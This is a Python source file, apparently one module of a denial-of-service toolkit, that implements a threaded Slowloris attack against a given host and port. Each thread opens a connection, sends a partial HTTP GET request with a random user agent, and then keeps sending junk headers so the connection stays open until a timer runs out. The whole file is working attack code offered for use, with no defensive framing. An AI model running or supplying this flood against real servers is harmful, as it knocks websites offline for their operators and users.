import random
import time
import socket
from threading import Thread
# Import modules for SLOWLORIS flood
import tools.randomData as randomData

def SLOWLORIS_ATTACK(threads, attack_time, target):
	# Finish
	global FINISH
	FINISH = False

	target_ip = target.split(":")[0]
	target_port = int(target.split(":")[1])

	print("[#] Attack started for " + str(attack_time) + " seconds..")
	
	threads_list = []

	# SLOWLORIS flood
	def slowloris_flood():
		global FINISH
		# Init socket
		sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		sock.settimeout(4)
		sock.connect((target_ip, target_port))

		sock.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0, 2000)).encode("utf-8"))
		sock.send("User-Agent: {}\r\n".format(randomData.random_useragent()).encode("utf-8"))
		sock.send("{}\r\n".format("Accept-language: en-US,en,q=0.5").encode("utf-8"))

		while not FINISH:
			if not FINISH:
				# Packet
				try:
					sock.send("X-a: {}\r\n".format(random.randint(1, 5000)).encode("utf-8"))
				except socket.error:
					print("[-] Failed..")
				else:
					print("[+] Sending to " + target)

	# Start threads
	for thread in range(0, threads):
		print("[#] Starting thread " + str(thread))
		t = Thread(target = slowloris_flood)
		t.start()
		threads_list.append(t)
	# Sleep selected seconds
	time.sleep(attack_time)
	# Terminate threads
	for thread in threads_list:
		FINISH = True
		thread.join()
	
	print("[!] SLOWLORIS attack stopped!")
